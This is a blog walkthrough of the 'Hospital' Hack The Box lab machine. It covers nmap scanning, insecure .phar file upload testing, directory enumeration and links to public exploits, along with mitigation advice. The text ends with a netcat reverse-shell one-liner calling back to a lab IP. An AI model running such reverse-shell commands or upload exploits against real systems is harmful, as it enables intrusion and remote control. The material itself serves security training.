<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title>Hospital - Insecure File Uploads, Business Email Compromise, and kernel exploits. | emdeh</title> <meta name="author" content=" "> <meta name="description" content="Hospital - Hack The Box walkthrough."> <meta name="keywords" content="cybersecurity, ai, technology cyber"> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link defer rel="stylesheet" href="https://unpkg.com/bootstrap-table@1.22.1/dist/bootstrap-table.min.css"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?19f3075a2d19613090fe9e16b564e1fe" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%F0%9F%91%A8%E2%80%8D%F0%9F%92%BB&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://emdeh.github.io/blog/2024/hospital-walkthrough/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?e74e74bf055e5729d44a7d031a5ca6a5" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?96d6b3e1c3604aca8b6134c7afdd5db6"></script> <script src="/assets/js/dark_mode.js?9b17307bb950ffa2e34be0227f53558f"></script> <script async src="https://www.googletagmanager.com/gtag/js?id=G-JZNPNDMG9P"></script> <script>function gtag(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],gtag("js",new Date),gtag("config","G-JZNPNDMG9P");</script> </head> <body class="fixed-top-nav "> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/">emdeh</a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">about</a> </li> <li class="nav-item active"> <a class="nav-link" href="/blog/">blog<span class="sr-only">(current)</span></a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">Repositories</a> </li> <li class="nav-item "> <a class="nav-link" href="/library/">Library</a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus</a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item" href="/blog/category/htb-machines">HTB-Machines</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/essential-eight/">Essential Eight</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/artificial-intelligence/">Artificial Intelligence</a> <div class="dropdown-divider"></div> <a class="dropdown-item" href="/blog/category/explainers/">Explainers</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fas fa-moon"></i> <i class="fas fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Hospital - Insecure File Uploads, Business Email Compromise, and kernel exploits.</h1> <p class="post-meta">April 8, 2024</p> <p class="post-tags"> <a href="/blog/2024"> <i class="fas fa-calendar fa-sm"></i> 2024 </a>   ·   <a href="/blog/tag/medium-box"> <i class="fas fa-hashtag fa-sm"></i> medium-box</a>   <a href="/blog/tag/htb"> <i class="fas fa-hashtag fa-sm"></i> HTB</a>   <a href="/blog/tag/insecure-file-upload"> <i class="fas fa-hashtag fa-sm"></i> insecure-file-upload</a>   <a href="/blog/tag/weak-credentials"> <i class="fas fa-hashtag fa-sm"></i> weak-credentials</a>   <a href="/blog/tag/unpatched"> <i class="fas fa-hashtag fa-sm"></i> unpatched</a>   <a href="/blog/tag/command-injection"> <i class="fas fa-hashtag fa-sm"></i> command-injection</a>   <a href="/blog/tag/remote-code-execution"> <i class="fas fa-hashtag fa-sm"></i> remote-code-execution</a>   <a href="/blog/tag/insecure-coding"> <i class="fas fa-hashtag fa-sm"></i> insecure-coding</a>   <a href="/blog/tag/inappropriate-file-permissions"> <i class="fas fa-hashtag fa-sm"></i> inappropriate-file-permissions</a>   <a href="/blog/tag/local-administrator"> <i class="fas fa-hashtag fa-sm"></i> local-administrator</a>   <a href="/blog/tag/phar"> <i class="fas fa-hashtag fa-sm"></i> phar</a>   <a href="/blog/tag/php"> <i class="fas fa-hashtag fa-sm"></i> php</a>   <a href="/blog/tag/eps"> <i class="fas fa-hashtag fa-sm"></i> eps</a>     ·   <a href="/blog/category/htb-machines"> <i class="fas fa-tag fa-sm"></i> HTB-Machines</a>   </p> </header> <article class="post-content"> <div id="markdown-content"> <h1 id="introduction">Introduction</h1> <p>Hospital is rated as a medium difficulty Windows machine. The kill chain was extensive. After registering a fraudulent account on a web frontend, an Insecure File Upload vulnerability that exploited to upload a malicious filetype, leading to initial access on a Linux webserver.</p> <p>An unpatched vulnerability in the Linux kernel was then exploited elevate privileges and steal hashes. Cracking the hashes led to unauthorised access of a business email account. The use of unpatched software was then exploited to breakout of the Linux webserver and obtain a shell on a Windows machine.</p> <p>From there, insecure coding practices had hardcoded a password in a batch script. The presence of a local administrator account and inappropriate file permissions resulted in obtaining <code class="language-plaintext highlighter-rouge">NT Authority</code> system access.</p> <p>The machine clearly demonstrates how various vulnerabilities can be chained together to ultimately become greater than the sum of their parts.</p> <hr> <h2 id="vulnerabilities-explored">Vulnerabilities explored</h2> <h4 id="insecure-file-upload">Insecure File Upload</h4> <p>Allows attackers to upload malicious files to a server, which can lead to unauthorised access or code execution. Mitigation involves strict validation of file types, sizes, and content, alongside implementing secure upload directories.</p> <h4 id="weak-credentials">Weak credentials</h4> <p>Use of easily guessed or default credentials, making unauthorised access simpler. Mitigation includes enforcing strong password policies and educating users about secure password practices.</p> <h4 id="unpatched-operating-systems">Unpatched Operating systems</h4> <p>Exploits known vulnerabilities in outdated operating systems; in this case, the Linux kernel. Regularly updating and patching operating systems and software mitigates this.</p> <h4 id="command-injections">Command injections</h4> <p>Occurs when an application passes unsafe user-supplied data to a system shell. Mitigation involves validating and sanitising all user inputs and using secure coding practices to avoid execution of untrusted commands.</p> <h4 id="remote-code-execution">Remote code execution</h4> <p>Allows an attacker to execute arbitrary code on a victim’s system. Mitigation strategies include keeping software up to date, employing least privilege principles, and using firewalls and intrusion detection/prevention systems.</p> <h4 id="insecure-coding">Insecure coding</h4> <p>Vulnerabilities introduced by errors or poor practices in software development. Mitigation involves using secure coding practices, regular code reviews, and automated security scanning.</p> <p>Improperly configured file or directory permissions that give unauthorised access. Regular audits and correctly setting permissions based on the principle of least privilege and separation of duties can mitigate this.</p> <h4 id="local-administrator-accounts">Local administrator accounts</h4> <p>Local accounts with high privileges not being properly managed or disabled. Best practices include disabling unnecessary accounts and using centralised authentication methods like Active Directory and LAPS.</p> <h2 id="tools">Tools</h2> <ul> <li><a href="https://github.com/nmap/nmap" rel="external nofollow noopener" target="_blank">Nmap</a></li> <li>Dirsearch</li> <li>Burpsuite</li> <li><a href="https://github.com/flozz/p0wny-shell/tree/master" rel="external nofollow noopener" target="_blank">PHP WebShell</a></li> <li><a href="https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629" rel="external nofollow noopener" target="_blank">Linux Kernel exploit for initial privilege escalation</a></li> <li>Hashcat for password cracking</li> <li><a href="https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection" rel="external nofollow noopener" target="_blank">CVE-2023-36664 exploit for command injection</a></li> <li>Evil-winrm</li> </ul> <h2 id="tactics-and-methods">Tactics and Methods</h2> <h4 id="exploiting-insecure-code">Exploiting insecure code</h4> <ul> <li> <strong>File Upload</strong>: Utilised to upload a <code class="language-plaintext highlighter-rouge">.phar</code> file, exploiting insecure file upload handling.</li> <li> <strong>Hardcoded Password</strong>: Identified in a batch script, demonstrating insecure coding practices.</li> </ul> <h4 id="stealing-hashes-and-exploiting-weak-credentials">Stealing hashes and exploiting weak credentials</h4> <ul> <li> <strong>Hash Stealing</strong>: Stole system hashes from the <code class="language-plaintext highlighter-rouge">/etc/shadow</code> file.</li> <li> <strong>Weak credentials:</strong> Cracking them to revealed weak credentials.</li> </ul> <h4 id="business-email-compromise">Business email compromise</h4> <ul> <li> <strong>Email Compromise</strong>: Achieved by exploiting weak credentials to access Dr. Williams’ email, illustrating the danger of weak passwords and the effectiveness of password cracking.</li> </ul> <h4 id="exploiting-unpatched-vulnerabilities">Exploiting unpatched vulnerabilities</h4> <ul> <li> <strong>Linux Kernel Exploit (CVE-2023-2640-CVE-2023-32629)</strong>: Leveraged to gain elevated privileges through an unpatched kernel vulnerability.</li> <li> <strong>Command Injection (CVE-2023-36664)</strong>: Used to inject and execute malicious commands in GhostScript, demonstrating the risk of unpatched software.</li> </ul> <h4 id="establishing-persistence">Establishing persistence</h4> <ul> <li> <strong>Malicious SSH Keys</strong>: Added to ensure persistent access, highlighting the importance of securing authentication mechanisms.</li> </ul> <h4 id="exploiting-folder-permissions-and-local-administrator-account">Exploiting folder permissions and local administrator account</h4> <ul> <li> <strong>Inappropriate Permissions</strong>: Exploited to achieve <code class="language-plaintext highlighter-rouge">NT Authority</code> system access, underscoring the need for proper file and directory permission settings.</li> <li> <strong>Local Admin Account</strong>: Utilised to grab the root flag to demonstrate access, showcasing the risks associated with not disabling unnecessary administrator accounts.</li> </ul> <h1 id="enumeration">Enumeration</h1> <h2 id="nmap-scanning">Nmap scanning</h2> <p>As always, we begin with an nmap scan.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-v</span> 10.129.8.141 | <span class="nb">tee </span>nmap-output.txt   
</code></pre></div></div> <p><strong><em>A note on <code class="language-plaintext highlighter-rouge">-A</code></em></strong></p> <ul> <li><em><code class="language-plaintext highlighter-rouge">-A</code> is a comprehensive scan. It stands for “aggressive scan” and combines several advanced scanning features in one command. Specifically, it enables OS detection (<code class="language-plaintext highlighter-rouge">-O</code>), version detection (<code class="language-plaintext highlighter-rouge">-sV</code>), script scanning (<code class="language-plaintext highlighter-rouge">-sC</code>), and traceroute (<code class="language-plaintext highlighter-rouge">--traceroute</code>).</em></li> <li><em>When you use <code class="language-plaintext highlighter-rouge">-A</code>, <code class="language-plaintext highlighter-rouge">nmap</code> not only performs a script scan with the default scripts (as <code class="language-plaintext highlighter-rouge">-sC</code> does) but also tries to identify the operating system of the target, determine service/version information more aggressively, and maps out the path packets take to the host.</em></li> <li> <em>Using <code class="language-plaintext highlighter-rouge">-A</code> is a good choice when you want a comprehensive overview of the target, but it’s more intrusive and might be detected more easily by intrusion detection systems (IDS) than using <code class="language-plaintext highlighter-rouge">-sC</code> alone. Always ensure you have authorization to perform such scans on the network you’re investigating.</em> &lt;/small&gt;</li> </ul> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2024-03-19 04:09 EDT
NSE: Loaded 156 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating NSE at 04:09
Completed NSE at 04:09, 0.00s elapsed
Initiating Ping Scan at 04:09
Scanning 10.129.82.144 <span class="o">[</span>2 ports]
Completed Ping Scan at 04:09, 0.32s elapsed <span class="o">(</span>1 total hosts<span class="o">)</span>
Initiating Parallel DNS resolution of 1 host. at 04:09
Completed Parallel DNS resolution of 1 host. at 04:09, 0.00s elapsed
Initiating Connect Scan at 04:09
Scanning 10.129.82.144 <span class="o">[</span>1000 ports]
Discovered open port 3389/tcp on 10.129.82.144
Discovered open port 22/tcp on 10.129.82.144
Discovered open port 139/tcp on 10.129.82.144
Discovered open port 445/tcp on 10.129.82.144
Discovered open port 8080/tcp on 10.129.82.144
Discovered open port 135/tcp on 10.129.82.144
Discovered open port 443/tcp on 10.129.82.144
Discovered open port 53/tcp on 10.129.82.144
Discovered open port 3269/tcp on 10.129.82.144
Discovered open port 593/tcp on 10.129.82.144
Discovered open port 88/tcp on 10.129.82.144
Discovered open port 464/tcp on 10.129.82.144
Discovered open port 2107/tcp on 10.129.82.144
Discovered open port 2103/tcp on 10.129.82.144
Discovered open port 3268/tcp on 10.129.82.144
Discovered open port 389/tcp on 10.129.82.144
Discovered open port 636/tcp on 10.129.82.144
Discovered open port 1801/tcp on 10.129.82.144
Discovered open port 2179/tcp on 10.129.82.144
Discovered open port 2105/tcp on 10.129.82.144
Completed Connect Scan at 04:10, 31.97s elapsed <span class="o">(</span>1000 total ports<span class="o">)</span>
Initiating Service scan at 04:10
Scanning 20 services on 10.129.82.144
Completed Service scan at 04:11, 64.47s elapsed <span class="o">(</span>20 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.129.82.144.
Initiating NSE at 04:11
Completed NSE at 04:12, 42.19s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 5.80s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Nmap scan report <span class="k">for </span>10.129.82.144
Host is up <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 980 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2024-03-19 15:10:36Z<span class="o">)</span>
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
443/tcp  open  ssl/http          Apache httpd 2.4.56 <span class="o">((</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28<span class="o">)</span>
| tls-alpn:
|_  http/1.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-favicon: Unknown favicon MD5: 924A68D347C80D0E502157E83812BB23
|_http-server-header: Apache/2.4.56 <span class="o">(</span>Win64<span class="o">)</span> OpenSSL/1.1.1t PHP/8.0.28
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: hospital.htb0., Site: Default-First-Site-Name<span class="o">)</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-09-06T10:49:03
| Not valid after:  2028-09-06T10:49:03
| MD5:   04b1:adfe:746a:788e:36c0:802a:bdf3:3119
|_SHA-1: 17e5:8592:278f:4e8f:8ce1:554c:3550:9c02:2825:91e3
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Issuer: <span class="nv">commonName</span><span class="o">=</span>DC.hospital.htb
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-03-18T15:06:28
| Not valid after:  2024-09-17T15:06:28
| MD5:   f596:b381:3127:b856:8368:11d2:c493:ebad
|_SHA-1: 9445:fdff:334c:4ad8:2560:bdcc:4665:a871:ec50:4d6b
| rdp-ntlm-info:
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-03-19T15:11:35+00:00
8080/tcp open  http              Apache httpd 2.4.55 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.55 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not <span class="nb">set</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| http-title: Login
|_Requested resource was login.php
Service Info: Host: DC<span class="p">;</span> OSs: Linux, Windows<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-time:
|   <span class="nb">date</span>: 2024-03-19T15:11:35
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

NSE: Script Post-scanning.
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Initiating NSE at 04:12
Completed NSE at 04:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>145.01 seconds

</code></pre></div></div> <h3 id="findings">Findings</h3> <p>The scan returned an extensive list of possibilities. At first glance items of interest are:</p> <ol> <li> <p><strong>Mixed Operating Systems</strong>: The service information suggests a mixture of Linux and Windows operating systems. This is indicated by the presence of OpenSSH running on Ubuntu and various Microsoft services such as Active Directory LDAP, Windows RPC, and Terminal Services. This could the use of a Windows Subsystem for Linux.</p> </li> <li> <p><strong>Domain and Active Directory Services</strong>: The presence of services such as LDAP (ports 389, 636, 3268, 3269) with references to a domain (<code class="language-plaintext highlighter-rouge">hospital.htb</code>), Microsoft Windows Active Directory, and Kerberos (port 88) suggest that the target is functioning as a domain controller within a Windows Active Directory environment. This could provide avenues for exploiting attack vectors relating to domain-level vulnerabilities or misconfigurations.</p> </li> <li> <p><strong>Web Services</strong>: Ports 443 and 8080 are running web services (Apache httpd) with SSL, where port 443’s service is identified as a webmail system for “Hospital Webmail”. The presence of a login page on port 8080 (<code class="language-plaintext highlighter-rouge">login.php</code>) suggests a potential target for web-based attacks, such as SQL injection, brute-force login, or exploiting web application vulnerabilities.</p> </li> <li> <p><strong>Potential Entry Points</strong>: The open ports 22 (SSH) and 3389 (RDP) are traditional entry points for accessing a system. The reported versions may be worth exploring for known vulnerabilities as a means to gain initial access. More likely, however, is they could be used after stealing credentials from elsewhere.</p> </li> <li> <p><strong>Service Versions and Vulnerabilities</strong>: The version information for several services, such as OpenSSH 9.0p1 on Ubuntu and Apache httpd 2.4.56 on Windows is worth checking for known vulnerabilities.</p> </li> <li> <p><strong>Network Service Protocols</strong>: The open ports associated with Microsoft-specific services (e.g., netbios-ssn on port 139, microsoft-ds on 445, ncacn_http on 593) hint at possible SMB or RPC vulnerabilities that could be exploited for lateral movement or privilege escalation within the network.</p> </li> </ol> <h2 id="domain-enumeration">Domain enumeration</h2> <p>Next, the domain is enumerated. First we add it to the hosts file to make it accessible.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"10.129.82.144 hospital.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div> <p>Navigating to Port <code class="language-plaintext highlighter-rouge">8080</code> reveals a logon page, and a link to register an account.</p> <p><img src="/assets/img/2024-hospital/landing-page.png" alt="landing-page.png" class="auto-resize"></p> <p>There is no validation on account registration, so a fraudulent account is created. <img src="/assets/img/2024-hospital/registration-page.png" alt="registration-page.png" class="auto-resize"></p> <p>Logging in with the account, and a page is presented to upload medical records, suggesting the presence of a file upload vulnerability.</p> <p><img src="/assets/img/2024-hospital/file-upload-page.png" alt="file-upload-page.png" class="auto-resize"></p> <h1 id="file-upload-enumeration">File upload enumeration</h1> <p>To begin, a test.jpg file is created and the results monitored in Burpsuite.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>──<span class="o">(</span>kali㉿kali<span class="o">)</span>-[~/Documents/htb-machines/hospital/exploits]
└─<span class="nv">$ </span><span class="nb">touch </span>test.jpg <span class="o">&amp;&amp;</span> <span class="nb">echo test</span> <span class="o">&gt;</span> test.jpg
</code></pre></div></div> <p>Burpsuite confirms the file was uploaded successfully.</p> <p><img src="/assets/img/2024-hospital/jpg-file-upload%20success.png" alt="jpg-file-upload success.png" class="auto-resize"></p> <p>Given the backend appears to be <code class="language-plaintext highlighter-rouge">PHP</code>, a <code class="language-plaintext highlighter-rouge">PHP</code> file is tried next.</p> <p><img src="/assets/img/2024-hospital/php-file-test.png" alt="php-file-test.png" class="auto-resize"></p> <p>It appears <code class="language-plaintext highlighter-rouge">PHP</code> files are disallowed. In this instance, a <code class="language-plaintext highlighter-rouge">PHAR</code> file can be tried.</p> <blockquote> <p><small> <em>A PHAR (PHP Archive) file is a packaging format for PHP applications, enabling entire PHP applications, including their supporting files, to be distributed and executed as a single archive file. Introduced in PHP 5.3, PHAR files are conceptually similar to Java’s JAR files, providing a way to distribute and deploy PHP applications easily.</em></small></p> <p><em>PHAR files can contain PHP code, HTML, images, and other resources needed by the application. They are designed to simplify deployment: instead of dealing with many files and directories, you only need to manage one PHAR file. This makes it easier to distribute, install, and update complex PHP applications.</em> &lt;/small&gt;</p> </blockquote> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~/Documents/htb-machines/hospital/exploits]
└─$ touch test.phar &amp;&amp; echo test &gt; test.phar
</code></pre></div></div> <p><img src="/assets/img/2024-hospital/phar-file-test.png" alt="phar-file-test.png" class="auto-resize"></p> <p><strong><em>A note of .phar files</em></strong></p> <ul> <li>The <code class="language-plaintext highlighter-rouge">PHAR</code> file works, indicating an Insecure File Upload vulnerability due to insecure coding where the potentially malicious file extension has not been disallowed.</li> <li>To exploit this, a <code class="language-plaintext highlighter-rouge">phar</code> based shell can be crafted and uploaded. Navigating to the file will execute the payload. So understanding where the files upload to is required.</li> <li>Browsing to the <code class="language-plaintext highlighter-rouge">/uploads</code> directory seems to indicate that location does not exist. Further directory enumeration is required to validate how the file upload vulnerability can be successfully exploited.</li> </ul> <p><img src="/assets/img/2024-hospital/uploads-404.png" alt="uploads-404.png" class="auto-resize"></p> <h2 id="directory-enumeration">Directory enumeration</h2> <p>Dirsearch can be used to enumerate the directories.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(kali㉿kali)-[~/Documents/htb-machines/hospital/scans]
└─$ dirsearch -u http://hospital.htb:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Documents/htb-machines/hospital/scans/reports/http_hospital.htb/_24-04-07_20-12-41.txt

Target: http://hospital.htb/

[20:12:41] Starting:

</code></pre></div></div> <p>The results differ from browser, showing a <strong>301 Moved Permanently</strong> and a <strong>403 forbidden</strong> status codes for `http://hospital.htb:8080/uploads/.</p> <p><img src="/assets/img/2024-hospital/uploads-redirect.png" alt="uploads-redirect.png" class="auto-resize"></p> <h1 id="exploitation">Exploitation</h1> <p>Given the uploads folder is not directly accessible, trying to access the file directly rather than traversing the folder structure may work.</p> <p>Uploading a shell with a <code class="language-plaintext highlighter-rouge">.phar</code> extension appears to work briefly, with the shell caught for a moment, but then dropped. Browsing to the malicious file, an error message appears.</p> <p><img src="/assets/img/2024-hospital/dropped-shell.png" alt="dropped-shell.png" class="auto-resize"></p> <p>Attempting a webshell is more successful, but command results are not returned and the attempts begin to return a 404 status code, indicating the file is no longer present.</p> <p><img src="/assets/img/2024-hospital/web-shell-fail.png" alt="web-shell-fail.png" class="auto-resize"></p> <p>Trying the initial shell again now also returns a 404 code, which may indicate some sort of time-based file process mechanism.</p> <p><img src="/assets/img/2024-hospital/404-rev-shell.png" alt="404-rev-shell.png" class="auto-resize"></p> <p>Returning tot he webshell responses, and attempting to redirecting them by forwarding it back to the terminal also fails.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.2 4321 &gt;/tmp/f
